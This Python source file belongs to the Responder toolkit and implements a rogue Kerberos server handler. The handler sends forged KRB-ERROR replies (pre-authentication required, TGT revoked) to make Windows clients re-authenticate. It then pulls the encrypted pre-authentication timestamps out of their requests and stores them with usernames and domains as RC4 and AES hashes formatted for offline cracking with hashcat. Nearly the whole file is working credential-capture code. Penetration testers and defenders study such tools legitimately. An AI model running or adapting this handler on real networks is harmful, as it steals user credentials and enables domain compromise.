#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import codecs
import struct
import time
from utils import *

if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

# Kerberos encryption types
ENCRYPTION_TYPES = {
	b'\x01': 'des-cbc-crc',
	b'\x03': 'des-cbc-md5',
	b'\x11': 'aes128-cts-hmac-sha1-96',
	b'\x12': 'aes256-cts-hmac-sha1-96',
	b'\x13': 'rc4-hmac',
	b'\x14': 'rc4-hmac-exp',
	b'\x17': 'rc4-hmac',
	b'\x18': 'rc4-hmac-exp',
}

def parse_asn1_length(data, offset):
	"""Parse ASN.1 length field (short or long form)"""
	if offset >= len(data):
		return 0, 0
	
	first_byte = data[offset]
	
	# Short form (length < 128)
	if first_byte < 0x80:
		return first_byte, 1
	
	# Long form
	num_octets = first_byte & 0x7F
	if num_octets == 0 or offset + 1 + num_octets > len(data):
		return 0, 0
	
	length = 0
	for i in range(num_octets):
		length = (length << 8) | data[offset + 1 + i]
	
	return length, 1 + num_octets

def encode_asn1_length(length):
	"""Encode length in ASN.1 format"""
	if length < 128:
		return struct.pack('B', length)
	
	# Long form
	length_bytes = []
	temp = length
	while temp > 0:
		length_bytes.insert(0, temp & 0xFF)
		temp >>= 8
	
	num_octets = len(length_bytes)
	result = struct.pack('B', 0x80 | num_octets)
	for byte in length_bytes:
		result += struct.pack('B', byte)
	
	return result

def extract_principal_name(data):
	"""Extract principal name from AS-REQ - searches in req-body only"""
	try:
		# Look for [4] req-body tag first to avoid PA-DATA
		req_body_offset = None
		for i in range(len(data) - 100):
			if data[i:i+1] == b'\xa4':  # [4] req-body
				req_body_offset = i
				break
		
		if req_body_offset is None:
			return "user"
		
		# Search for [1] cname AFTER req-body starts
		search_start = req_body_offset
		search_end = min(search_start + 150, len(data) - 20)
		
		for i in range(search_start, search_end):
			# Look for GeneralString (0x1b) with reasonable length
			if data[i:i+1] == b'\x1b':
				name_len = data[i+1] if i+1 < len(data) else 0
				if 1 < name_len < 30 and i + 2 + name_len <= len(data):
					name = data[i+2:i+2+name_len].decode('latin-1', errors='ignore')
					# Validate: printable, no control chars, looks like username
					if (name and 
						name.isprintable() and 
						name.isascii() and
						not any(c in name for c in ['\x00', '\n', '\r', '\t']) and
						all(c.isalnum() or c in '.-_@' for c in name)):
						return name
		
		return "user"
	except:
		return "user"

def extract_realm(data):
	"""Extract realm from AS-REQ - searches in req-body only"""
	try:
		# Look for [4] req-body tag first
		req_body_offset = None
		for i in range(len(data) - 100):
			if data[i:i+1] == b'\xa4':  # [4] req-body
				req_body_offset = i
				break
		
		if req_body_offset is None:
			return settings.Config.MachineName.upper()
		
		# Search for realm AFTER req-body starts
		search_start = req_body_offset + 10
		search_end = min(search_start + 150, len(data) - 20)
		
		for i in range(search_start, search_end):
			# Look for GeneralString (0x1b) with reasonable length
			if data[i:i+1] == b'\x1b':
				realm_len = data[i+1] if i+1 < len(data) else 0
				# Realm should be 5-50 chars (like "DOMAIN.LOCAL")
				if 5 < realm_len < 50 and i + 2 + realm_len <= len(data):
					realm = data[i+2:i+2+realm_len].decode('latin-1', errors='ignore')
					# Validate: printable ASCII, contains dot, looks like domain
					if (realm and 
						realm.isprintable() and 
						realm.isascii() and
						'.' in realm and 
						realm.count('.') >= 1 and realm.count('.') <= 5 and
						not any(c in realm for c in ['\x00', '\n', '\r', '\t', '/', ':', ' ']) and
						all(c.isalnum() or c in '.-' for c in realm)):
						return realm
		
		return settings.Config.MachineName.upper()
	except:
		return settings.Config.MachineName.upper()

def find_msg_type(data):
	"""Find Kerberos message type by parsing ASN.1 structure"""
	try:
		offset = 0
		
		# Check APPLICATION tag
		# [10] for AS-REQ (0x6a)
		# [12] for TGS-REQ (0x6c)
		if offset >= len(data):
			return None, False, None, None
		
		app_tag = data[offset]
		if app_tag not in [0x6a, 0x6c]:  # AS-REQ or TGS-REQ
			return None, False, None, None
		
		offset += 1
		
		# Parse outer length
		length, consumed = parse_asn1_length(data, offset)
		if consumed == 0:
			return None, False, None, None
		offset += consumed
		
		# SEQUENCE tag
		if offset >= len(data) or data[offset] != 0x30:
			return None, False, None, None
		offset += 1
		
		# Parse SEQUENCE length
		seq_length, consumed = parse_asn1_length(data, offset)
		if consumed == 0:
			return None, False, None, None
		offset += consumed
		
		# [1] pvno
		if offset >= len(data) or data[offset] != 0xa1:
			return None, False, None, None
		offset += 1
		
		pvno_len, consumed = parse_asn1_length(data, offset)
		offset += consumed + pvno_len
		
		# [2] msg-type
		if offset >= len(data) or data[offset] != 0xa2:
			return None, False, None, None
		offset += 1
		
		msgtype_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		# INTEGER tag
		if offset >= len(data) or data[offset] != 0x02:
			return None, False, None, None
		offset += 1
		
		int_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		if offset >= len(data):
			return None, False, None, None
		
		msg_type = data[offset]
		
		# Extract client name and realm for KRB-ERROR response
		cname = extract_principal_name(data)
		realm = extract_realm(data)
		
		return msg_type, True, cname, realm
	
	except:
		return None, False, None, None

def find_padata_and_etype(data):
	"""
	Search for PA-DATA and determine encryption type
	Returns: (has_padata, etype) where etype is the encryption type number or None
	"""
	try:
		# Look for [3] PA-DATA tag (0xa3)
		for i in range(len(data) - 60):
			if data[i:i+1] == b'\xa3':
				# Found PA-DATA, now we need to check if it contains PA-ENC-TIMESTAMP
				# Structure: [3] SEQUENCE OF { [1] padata-type, [2] padata-value }
				
				# Look for [1] padata-type within next 30 bytes
				has_pa_enc_timestamp = False
				padata_value_offset = None
				
				for j in range(i, min(i + 30, len(data) - 10)):
					if data[j:j+1] == b'\xa1':  # [1] padata-type
						# Check if padata-type = 2 (PA-ENC-TIMESTAMP)
						# Pattern: a1 03 02 01 02
						if j + 4 < len(data) and data[j+1:j+5] == b'\x03\x02\x01\x02':
							has_pa_enc_timestamp = True
							# Next should be [2] padata-value
							break
				
				if not has_pa_enc_timestamp:
					# PA-DATA exists but not PA-ENC-TIMESTAMP
					# This is normal for first AS-REQ
					return False, None
				
				# Now look for [2] padata-value which contains EncryptedData
				for j in range(i, min(i + 50, len(data) - 10)):
					if data[j:j+1] == b'\xa2':  # [2] padata-value
						# Inside padata-value is EncryptedData
						# Now look for [0] etype inside EncryptedData
						for k in range(j, min(j + 30, len(data) - 5)):
							if data[k:k+1] == b'\xa0':  # [0] etype
								# Pattern: a0 03 02 01 <etype>
								if k + 4 < len(data) and data[k+1:k+3] == b'\x03\x02':
									etype = data[k+4]
									if settings.Config.Verbose:
										etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
										print(text('[KERB] Found PA-ENC-TIMESTAMP with etype %d (%s)' % (etype, etype_name)))
									return True, etype
				
				# Found PA-DATA but couldn't determine etype
				if settings.Config.Verbose:
					print(text('[KERB] Found PA-DATA but could not parse etype'))
				return True, None
		
		# No PA-DATA found
		return False, None
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] Error in find_padata_and_etype: %s' % str(e)))
		return False, None

def extract_aes_hash(data, padata_offset, etype):
	"""
	Extract AES Kerberos hash for hashcat mode 19900
	Format: $krb5pa$<etype>$<user>$<realm>$<cipher>
	
	For AS-REQ with PA-ENC-TIMESTAMP, we need ONLY the cipher bytes,
	not the EncryptedData structure.
	"""
	try:
		# PA-DATA structure:
		# [3] PA-DATA
		#   [1] padata-type = 2
		#   [2] padata-value = OCTET STRING {
		#     EncryptedData = SEQUENCE {
		#       [0] etype = 18
		#       [2] cipher = OCTET STRING { CIPHER_BYTES }  ← We want ONLY this!
		#     }
		#   }
		
		# Strategy: Find [0] etype, then find [2] cipher AFTER it, extract cipher bytes
		search_start = max(0, padata_offset - 30)
		search_end = min(len(data), padata_offset + 100)
		
		# First, find [0] etype to confirm we're in the right place
		etype_found = False
		etype_offset = None
		
		for i in range(search_start, search_end):
			if data[i:i+1] == b'\xa0':  # [0] etype
				# Verify pattern: a0 03 02 01 <etype>
				if i + 4 < len(data) and data[i+1:i+3] == b'\x03\x02':
					found_etype = data[i+4]
					if found_etype == etype:
						etype_found = True
						etype_offset = i
						if settings.Config.Verbose:
							print(text('[KERB] Found [0] etype at offset %d' % i))
						break
		
		if not etype_found:
			if settings.Config.Verbose:
				print(text('[KERB] Could not find [0] etype'))
			return None
		
		# Now find [2] cipher field AFTER the etype
		cipher_search_start = etype_offset + 5
		cipher_search_end = min(len(data), etype_offset + 80)
		
		for i in range(cipher_search_start, cipher_search_end):
			if data[i:i+1] == b'\xa2':  # [2] cipher field
				# Parse length
				offset = i + 1
				if offset >= len(data):
					continue
				
				len_byte = data[offset]
				if len_byte < 0x80:
					# Short form
					offset += 1
				else:
					# Long form
					num_octets = len_byte & 0x7F
					offset += 1 + num_octets
				
				# Should be OCTET STRING (0x04)
				if offset >= len(data) or data[offset:offset+1] != b'\x04':
					continue
				
				offset += 1
				
				# Get OCTET STRING length
				if offset >= len(data):
					continue
				
				cipher_len_byte = data[offset]
				cipher_len = 0
				
				if cipher_len_byte < 0x80:
					# Short form
					cipher_len = cipher_len_byte
					offset += 1
				else:
					# Long form
					num_octets = cipher_len_byte & 0x7F
					for j in range(num_octets):
						if offset + 1 + j < len(data):
							cipher_len = (cipher_len << 8) | data[offset + 1 + j]
					offset += 1 + num_octets
				
				# Extract ONLY the cipher bytes
				if offset + cipher_len > len(data):
					continue
				
				if cipher_len < 40 or cipher_len > 100:
					continue
				
				cipher_bytes = data[offset:offset+cipher_len]
				
				if settings.Config.Verbose:
					print(text('[KERB] Extracted cipher: %d bytes from offset %d' % (len(cipher_bytes), offset)))
				
				# Extract username and realm
				name = extract_principal_name(data)
				realm = extract_realm(data)
				
				# Convert cipher to hex
				cipher_hex = codecs.encode(cipher_bytes, 'hex').decode('latin-1')
				
				# Build hashcat mode 19900 format
				# $krb5pa$<etype>$<user>$<realm>$<cipher>
				BuildHash = "$krb5pa$%d$%s$%s$%s" % (
					etype, 
					name, 
					realm, 
					cipher_hex
				)
				
				if settings.Config.Verbose:
					print(text('[KERB] Built hash for mode 19900 with %d bytes of cipher' % len(cipher_bytes)))
				
				return {
					'hash': BuildHash,
					'name': name,
					'domain': realm,
					'enc_type': 'aes256-cts-hmac-sha1-96' if etype == 18 else 'aes128-cts-hmac-sha1-96'
				}
		
		if settings.Config.Verbose:
			print(text('[KERB] Could not find [2] cipher field'))
		return None
		
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] AES extraction error: %s' % str(e)))
		return None

def find_padata_etype23(data):
	"""Legacy function - Search for PA-DATA with etype 23 (RC4-HMAC)"""
	has_padata, etype = find_padata_and_etype(data)
	if has_padata and etype == 0x17:  # 23 = 0x17
		# Look for the encrypted timestamp offset
		for i in range(len(data) - 60):
			if data[i:i+1] == b'\x17':
				for j in range(i, min(i+20, len(data)-60)):
					if data[j:j+1] == b'\xa2':
						return j
	return None

def extract_krb5_hash_from_offset(data, offset):
	"""
	Extract Kerberos RC4 hash for hashcat mode 13100
	Format: $krb5tgs$23$*user$realm$spn*$checksum$edata2
	"""
	try:
		# Look for the hash pattern
		# \xa2\x36\x04\x34 or \xa2\x35\x04\x33
		search_start = max(0, offset - 10)
		search_end = min(len(data) - 60, offset + 30)
		
		for i in range(search_start, search_end):
			if data[i:i+4] in [b'\xa2\x36\x04\x34', b'\xa2\x35\x04\x33']:
				HashLen = struct.unpack('<b', data[i+1:i+2])[0]
				if HashLen in [53, 54]:
					hash_offset = i + 4
					if hash_offset + 52 > len(data):
						continue
					
					Hash = data[hash_offset:hash_offset+52]
					if len(Hash) != 52:
						continue
					
					# Extract username and realm using robust functions
					Name = extract_principal_name(data)
					Domain = extract_realm(data)
					
					if Name and Domain:
						# For mode 13100, split into checksum and edata2
						# checksum = first 16 bytes
						# edata2 = remaining 36 bytes
						checksum = Hash[:16]
						edata2 = Hash[16:]
						
						checksum_hex = codecs.encode(checksum, 'hex').decode('latin-1')
						edata2_hex = codecs.encode(edata2, 'hex').decode('latin-1')
						
						# SPN for AS-REQ is krbtgt/REALM
						spn = "krbtgt/" + Domain
						
						# Build hashcat mode 13100 format
						# $krb5tgs$23$*user$realm$spn*$checksum$edata2
						BuildHash = "$krb5tgs$23$*%s$%s$%s*$%s$%s" % (
							Name, Domain, spn, checksum_hex, edata2_hex
						)
						
						if settings.Config.Verbose:
							print(text('[KERB] Extracted RC4 hash for %s@%s (mode 13100)' % (Name, Domain)))
						
						return {
							'hash': BuildHash,
							'name': Name,
							'domain': Domain,
							'enc_type': 'rc4-hmac'
						}
				break
		
		return None
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] RC4 extraction error: %s' % str(e)))
		return None

def build_krb_error(error_code, cname, realm):
	"""Build KRB-ERROR response according to RFC 4120"""
	try:
		# Get current time
		current_time = time.strftime("%Y%m%d%H%M%SZ", time.gmtime())
		
		# [0] pvno = 5
		pvno = b'\xa0\x03\x02\x01\x05'
		
		# [1] msg-type = 30 (KRB-ERROR)
		msg_type = b'\xa1\x03\x02\x01\x1e'
		
		# [4] stime (server time) - GeneralizedTime
		stime_str = current_time.encode('latin-1')
		stime = b'\xa4' + encode_asn1_length(len(stime_str) + 2) + b'\x18' + struct.pack('B', len(stime_str)) + stime_str
		
		# [5] susec (microseconds) - REQUIRED!
		susec = b'\xa5\x03\x02\x01\x00'  # 0 microseconds
		
		# [6] error-code
		error_code_bytes = b'\xa6\x03\x02\x01' + struct.pack('B', error_code)
		
		# [9] realm (server realm)
		realm_bytes = realm.encode('latin-1')
		realm_field = b'\xa9' + encode_asn1_length(len(realm_bytes) + 2) + b'\x1b' + struct.pack('B', len(realm_bytes)) + realm_bytes
		
		# [10] sname (server principal name) - krbtgt/REALM
		sname_str = b'krbtgt'
		sname_name = b'\x1b' + struct.pack('B', len(sname_str)) + sname_str
		sname_realm = b'\x1b' + struct.pack('B', len(realm_bytes)) + realm_bytes
		
		# name-string is SEQUENCE OF GeneralString
		sname_string_seq = b'\x30' + encode_asn1_length(len(sname_name) + len(sname_realm)) + sname_name + sname_realm
		
		# name-type [0] = NT-SRV-INST (2)
		sname_type = b'\xa0\x03\x02\x01\x02'
		
		# name-string [1]
		sname_string = b'\xa1' + encode_asn1_length(len(sname_string_seq)) + sname_string_seq
		
		# Complete PrincipalName
		sname_principal = b'\x30' + encode_asn1_length(len(sname_type) + len(sname_string)) + sname_type + sname_string
		
		# [10] tag wrapper
		sname_field = b'\xaa' + encode_asn1_length(len(sname_principal)) + sname_principal
		
		# [11] e-data (only for error 25 - PREAUTH_REQUIRED)
		edata_field = b''
		if error_code == 25:
			# Build ETYPE-INFO2 for supported encryption types
			# Include salt (realm) to match Windows KDC behavior
			
			# Convert realm to UTF-8 for salt
			salt_bytes = realm.encode('utf-8')
			salt_field = b'\xa1' + encode_asn1_length(len(salt_bytes) + 2) + b'\x1b' + struct.pack('B', len(salt_bytes)) + salt_bytes
			
			# ETYPE-INFO2-ENTRY for AES256 (18) with salt
			etype_aes256 = b'\x30' + encode_asn1_length(5 + len(salt_field)) + b'\xa0\x03\x02\x01\x12' + salt_field
			
			# ETYPE-INFO2-ENTRY for RC4 (23) - RC4 doesn't use salt typically
			etype_rc4 = b'\x30\x05\xa0\x03\x02\x01\x17'
			
			# ETYPE-INFO2-ENTRY for AES128 (17) with salt
			etype_aes128 = b'\x30' + encode_asn1_length(5 + len(salt_field)) + b'\xa0\x03\x02\x01\x11' + salt_field
			
			# SEQUENCE OF ETYPE-INFO2-ENTRY (AES first, then RC4)
			etype_seq = b'\x30' + encode_asn1_length(len(etype_aes256) + len(etype_rc4) + len(etype_aes128)) + etype_aes256 + etype_rc4 + etype_aes128
			
			# PA-DATA for ETYPE-INFO2
			# [1] padata-type = 19 (PA-ETYPE-INFO2)
			padata_type = b'\xa1\x03\x02\x01\x13'
			
			# [2] padata-value = OCTET STRING containing etype_seq
			padata_value = b'\xa2' + encode_asn1_length(len(etype_seq) + 2) + b'\x04' + encode_asn1_length(len(etype_seq)) + etype_seq
			
			# PA-DATA SEQUENCE
			padata = b'\x30' + encode_asn1_length(len(padata_type) + len(padata_value)) + padata_type + padata_value
			
			# METHOD-DATA is SEQUENCE OF PA-DATA
			method_data = b'\x30' + encode_asn1_length(len(padata)) + padata
			
			# [12] e-data = OCTET STRING containing METHOD-DATA
			edata_field = b'\xac' + encode_asn1_length(len(method_data) + 2) + b'\x04' + encode_asn1_length(len(method_data)) + method_data
		
		# Build inner SEQUENCE in correct order: [0][1][4][5][6][9][10][12]
		inner_seq = pvno + msg_type + stime + susec + error_code_bytes + realm_field + sname_field + edata_field
		
		# Wrap in SEQUENCE
		sequence = b'\x30' + encode_asn1_length(len(inner_seq)) + inner_seq
		
		# Wrap in APPLICATION [30]
		krb_error = b'\x7e' + encode_asn1_length(len(sequence)) + sequence
		
		return krb_error
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] Error building KRB-ERROR: %s' % str(e)))
		# Return minimal valid KRB-ERROR
		return b'\x7e\x39\x30\x37\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f20251231000000Z\xa5\x03\x02\x01\x00\xa6\x03\x02\x01\x19'

def ParseMSKerbv5UDP(Data):
	"""Parse Kerberos AS-REQ from UDP packet"""
	try:
		if len(Data) < 50:
			if settings.Config.Verbose:
				print(text('[KERB] UDP packet too short: %d bytes' % len(Data)))
			return None, None, None, None
		
		msg_type, valid, cname, realm = find_msg_type(Data)
		
		if not valid:
			if settings.Config.Verbose:
				print(text('[KERB] UDP invalid Kerberos structure'))
			return None, None, None, None
		
		if msg_type == 0x0c:  # TGS-REQ
			if settings.Config.Verbose:
				print(text('[KERB] UDP received TGS-REQ from %s@%s - forcing re-authentication' % (cname, realm)))
			return None, 20, cname, realm  # KDC_ERR_TGT_REVOKED
		
		if msg_type != 0x0a:
			if settings.Config.Verbose:
				print(text('[KERB] UDP not an AS-REQ or TGS-REQ message (type=%d)' % msg_type))
			return None, None, None, None
		
		if settings.Config.Verbose:
			print(text('[KERB] UDP valid AS-REQ detected from %s@%s' % (cname, realm)))
		
		# Check for PA-DATA and get encryption type
		has_padata, etype = find_padata_and_etype(Data)
		
		if not has_padata:
			if settings.Config.Verbose:
				print(text('[KERB] UDP no PA-DATA found (will request pre-auth)'))
			return None, 25, cname, realm  # KDC_ERR_PREAUTH_REQUIRED
		
		# Check encryption type
		if etype is None:
			if settings.Config.Verbose:
				print(text('[KERB] UDP found PA-DATA but could not determine etype'))
			return None, 25, cname, realm
		
		# Handle different encryption types
		if etype == 0x17:  # RC4-HMAC (etype 23)
			# Extract RC4 hash for hashcat mode 13100
			padata_offset = find_padata_etype23(Data)
			if padata_offset is None:
				if settings.Config.Verbose:
					print(text('[KERB] UDP found RC4 PA-DATA but failed to locate encrypted timestamp'))
				return None, None, cname, realm
			
			result = extract_krb5_hash_from_offset(Data, padata_offset)
			
			if result:
				if settings.Config.Verbose:
					print(text('[KERB] UDP successfully extracted RC4 hash for %s@%s (hashcat -m 13100)' % (
						result['name'], result['domain'])))
				return result, None, cname, realm
		
		elif etype in [0x11, 0x12]:  # AES128 (17) or AES256 (18)
			# Extract AES hash for hashcat mode 19900
			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
			if settings.Config.Verbose:
				print(text('[KERB] UDP extracting %s hash (hashcat -m 19900)' % etype_name))
			
			# Find PA-DATA offset
			padata_offset = None
			for i in range(len(Data) - 60):
				if Data[i:i+1] == b'\xa3':  # [3] PA-DATA
					padata_offset = i
					break
			
			if padata_offset:
				result = extract_aes_hash(Data, padata_offset, etype)
				
				if result:
					if settings.Config.Verbose:
						print(text('[KERB] UDP successfully extracted AES hash for %s@%s (hashcat -m 19900)' % (
							result['name'], result['domain'])))
					return result, None, cname, realm
			
			if settings.Config.Verbose:
				print(text('[KERB] UDP found AES PA-DATA but failed to extract hash'))
			return None, None, cname, realm
		
		else:
			# Unsupported encryption type
			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
			if settings.Config.Verbose:
				print(text('[KERB] UDP PA-DATA uses unsupported etype %d (%s)' % (etype, etype_name)))
			return None, None, cname, realm
		
		if settings.Config.Verbose:
			print(text('[KERB] UDP failed to extract hash'))
		return None, None, cname, realm
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] UDP parsing error: %s' % str(e)))
		return None, None, None, None

def ParseMSKerbv5TCP(Data):
	"""Parse Kerberos AS-REQ from TCP connection"""
	try:
		if len(Data) < 54:
			if settings.Config.Verbose:
				print(text('[KERB] TCP packet too short: %d bytes' % len(Data)))
			return None, None, None, None
		
		# Skip 4-byte length prefix for TCP
		data = Data[4:]
		
		msg_type, valid, cname, realm = find_msg_type(data)
		
		if not valid:
			if settings.Config.Verbose:
				print(text('[KERB] TCP invalid Kerberos structure'))
			return None, None, None, None
		
		if msg_type == 0x0c:  # TGS-REQ
			if settings.Config.Verbose:
				print(text('[KERB] TCP received TGS-REQ from %s@%s - forcing re-authentication' % (cname, realm)))
			return None, 20, cname, realm  # KDC_ERR_TGT_REVOKED
		
		if msg_type != 0x0a:
			if settings.Config.Verbose:
				print(text('[KERB] TCP not an AS-REQ or TGS-REQ message (type=%d)' % msg_type))
			return None, None, None, None
		
		if settings.Config.Verbose:
			print(text('[KERB] TCP valid AS-REQ detected from %s@%s' % (cname, realm)))
		
		# Check for PA-DATA and get encryption type
		has_padata, etype = find_padata_and_etype(data)
		
		if not has_padata:
			if settings.Config.Verbose:
				print(text('[KERB] TCP no PA-DATA found (will request pre-auth)'))
			return None, 25, cname, realm
		
		if etype is None:
			if settings.Config.Verbose:
				print(text('[KERB] TCP found PA-DATA but could not determine etype'))
			return None, 25, cname, realm
		
		# Handle different encryption types
		if etype == 0x17:  # RC4-HMAC
			padata_offset = find_padata_etype23(data)
			if padata_offset is None:
				if settings.Config.Verbose:
					print(text('[KERB] TCP found RC4 PA-DATA but failed to locate encrypted timestamp'))
				return None, None, cname, realm
			
			result = extract_krb5_hash_from_offset(data, padata_offset)
			
			if result:
				if settings.Config.Verbose:
					print(text('[KERB] TCP successfully extracted RC4 hash for %s@%s (hashcat -m 13100)' % (
						result['name'], result['domain'])))
				return result, None, cname, realm
		
		elif etype in [0x11, 0x12]:  # AES128/256
			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
			if settings.Config.Verbose:
				print(text('[KERB] TCP extracting %s hash (hashcat -m 19900)' % etype_name))
			
			padata_offset = None
			for i in range(len(data) - 60):
				if data[i:i+1] == b'\xa3':
					padata_offset = i
					break
			
			if padata_offset:
				result = extract_aes_hash(data, padata_offset, etype)
				
				if result:
					if settings.Config.Verbose:
						print(text('[KERB] TCP successfully extracted AES hash for %s@%s (hashcat -m 19900)' % (
							result['name'], result['domain'])))
					return result, None, cname, realm
			
			if settings.Config.Verbose:
				print(text('[KERB] TCP found AES PA-DATA but failed to extract hash'))
			return None, None, cname, realm
		
		else:
			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
			if settings.Config.Verbose:
				print(text('[KERB] TCP PA-DATA uses unsupported etype %d (%s)' % (etype, etype_name)))
			return None, None, cname, realm
		
		if settings.Config.Verbose:
			print(text('[KERB] TCP failed to extract hash'))
		return None, None, cname, realm
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[KERB] TCP parsing error: %s' % str(e)))
		return None, None, None, None

class KerbTCP(BaseRequestHandler):
	"""Kerberos TCP handler with RC4 and AES support"""
	
	def handle(self):
		try:
			data = self.request.recv(2048)
			
			if not data:
				return
			
			if settings.Config.Verbose:
				print(text('[KERB] TCP connection from %s, packet size: %d bytes' % (
					self.client_address[0].replace("::ffff:", ""), len(data))))
			
			result, error_code, cname, realm = ParseMSKerbv5TCP(data)
			
			if result:
				# Got hash!
				KerbHash = result['hash']
				name = result['name']
				domain = result['domain']
				enc_type = result['enc_type']
				
				parts = KerbHash.split('$')
				hash_value = parts[6] if len(parts) >= 7 else parts[5] if len(parts) >= 6 else ''
				
				SaveToDb({
					'module': 'KERB',
					'type': 'MSKerbv5',
					'client': self.client_address[0],
					'user': domain + '\\' + name,
					'hash': hash_value,
					'fullhash': KerbHash,
				})
				
				hashcat_mode = '19900' if 'aes' in enc_type else '13100'
				print(color("[*] [KERB] TCP %s hash captured from %s for user %s\\%s (hashcat -m %s)" % (
					enc_type, 
					self.client_address[0].replace("::ffff:", ""), 
					domain, 
					name,
					hashcat_mode
				), 3, 1))
			
			elif error_code == 25:
				# Send KRB-ERROR to request pre-authentication
				krb_error = build_krb_error(25, cname, realm)
				
				# Add TCP length prefix (4 bytes)
				tcp_length = struct.pack('>I', len(krb_error))
				response = tcp_length + krb_error
				
				self.request.send(response)
				
				if settings.Config.Verbose:
					print(text('[KERB] TCP sent KRB-ERROR (pre-auth required) to %s' % 
						self.client_address[0].replace("::ffff:", "")))
			
			elif error_code == 7:
				# Send KRB-ERROR to force re-authentication (TGS-REQ received)
				krb_error = build_krb_error(7, cname, realm)
				
				# Add TCP length prefix (4 bytes)
				tcp_length = struct.pack('>I', len(krb_error))
				response = tcp_length + krb_error
				
				self.request.send(response)
				
				if settings.Config.Verbose:
					print(text('[KERB] TCP sent KRB-ERROR (service unknown) to force AS-REQ from %s' % 
						self.client_address[0].replace("::ffff:", "")))
			
			elif error_code == 20:
				# Send KRB-ERROR to invalidate TGT (TGS-REQ received)
				krb_error = build_krb_error(20, cname, realm)
				
				# Add TCP length prefix (4 bytes)
				tcp_length = struct.pack('>I', len(krb_error))
				response = tcp_length + krb_error
				
				self.request.send(response)
				
				if settings.Config.Verbose:
					print(text('[KERB] TCP sent KRB-ERROR (TGT revoked) to force AS-REQ from %s' % 
						self.client_address[0].replace("::ffff:", "")))
			
			elif settings.Config.Verbose:
				print(text('[KERB] TCP no hash captured from %s' % 
					self.client_address[0].replace("::ffff:", "")))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[KERB] TCP exception: %s' % str(e)))

class KerbUDP(BaseRequestHandler):
	"""Kerberos UDP handler with RC4 and AES support"""
	
	def handle(self):
		try:
			data, soc = self.request
			
			if not data:
				return
			
			if settings.Config.Verbose:
				print(text('[KERB] UDP packet from %s, size: %d bytes' % (
					self.client_address[0].replace("::ffff:", ""), len(data))))
			
			result, error_code, cname, realm = ParseMSKerbv5UDP(data)
			
			if result:
				# Got hash!
				KerbHash = result['hash']
				name = result['name']
				domain = result['domain']
				enc_type = result['enc_type']
				
				parts = KerbHash.split('$')
				hash_value = parts[6] if len(parts) >= 7 else parts[5] if len(parts) >= 6 else ''
				
				SaveToDb({
					'module': 'KERB',
					'type': 'MSKerbv5',
					'client': self.client_address[0],
					'user': domain + '\\' + name,
					'hash': hash_value,
					'fullhash': KerbHash,
				})
				
				hashcat_mode = '19900' if 'aes' in enc_type else '13100'
				print(color("[*] [KERB] UDP %s hash captured from %s for user %s\\%s (hashcat -m %s)" % (
					enc_type,
					self.client_address[0].replace("::ffff:", ""), 
					domain, 
					name,
					hashcat_mode
				), 3, 1))
			
			elif error_code == 25:
				# Send KRB-ERROR to request pre-authentication
				krb_error = build_krb_error(25, cname, realm)
				
				soc.sendto(krb_error, self.client_address)
				
				if settings.Config.Verbose:
					print(text('[KERB] UDP sent KRB-ERROR (pre-auth required) to %s' % 
						self.client_address[0].replace("::ffff:", "")))
			
			elif error_code == 7:
				# Send KRB-ERROR to force re-authentication (TGS-REQ received)
				krb_error = build_krb_error(7, cname, realm)
				
				soc.sendto(krb_error, self.client_address)
				
				if settings.Config.Verbose:
					print(text('[KERB] UDP sent KRB-ERROR (service unknown) to force AS-REQ from %s' % 
						self.client_address[0].replace("::ffff:", "")))
			
			elif error_code == 20:
				# Send KRB-ERROR to invalidate TGT (TGS-REQ received)
				krb_error = build_krb_error(20, cname, realm)
				
				soc.sendto(krb_error, self.client_address)
				
				if settings.Config.Verbose:
					print(text('[KERB] UDP sent KRB-ERROR (TGT revoked) to force AS-REQ from %s' % 
						self.client_address[0].replace("::ffff:", "")))
			
			elif settings.Config.Verbose:
				print(text('[KERB] UDP no hash captured from %s' % 
					self.client_address[0].replace("::ffff:", "")))
		
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[KERB] UDP exception: %s' % str(e)))
